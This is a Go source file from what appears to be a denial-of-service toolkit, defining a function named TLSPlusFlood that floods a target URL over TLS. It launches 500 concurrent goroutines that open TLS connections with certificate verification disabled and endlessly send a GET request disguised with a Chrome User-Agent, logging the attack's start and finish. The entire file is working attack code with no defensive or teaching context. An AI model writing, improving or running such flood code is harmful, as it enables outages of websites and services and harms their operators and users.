package methods

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/url"
	"strings"
	"time"
)

func TLSPlusFlood(ctx context.Context, target string, sec int) {
	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Failed to parse URL: %v\n", err)
		return
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	fmt.Printf("[%s] TLS+ (Direct Raw) Attack started on %s for %ds\n",
		time.Now().Format("15:04:05"), target, sec)

	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
		u.Path, u.Host)
	payloadBytes := []byte(payload)

	for i := 0; i < 500; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, err := tls.Dial("tcp", host, &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         u.Host,
				})
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}

				for {
					select {
					case <-ctx.Done():
						conn.Close()
						return
					default:
					}

					conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
					_, err := conn.Write(payloadBytes)
					if err != nil {
						break
					}
				}
				conn.Close()
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] TLS+ (Direct) Attack finished.\n", time.Now().Format("15:04:05"))
}
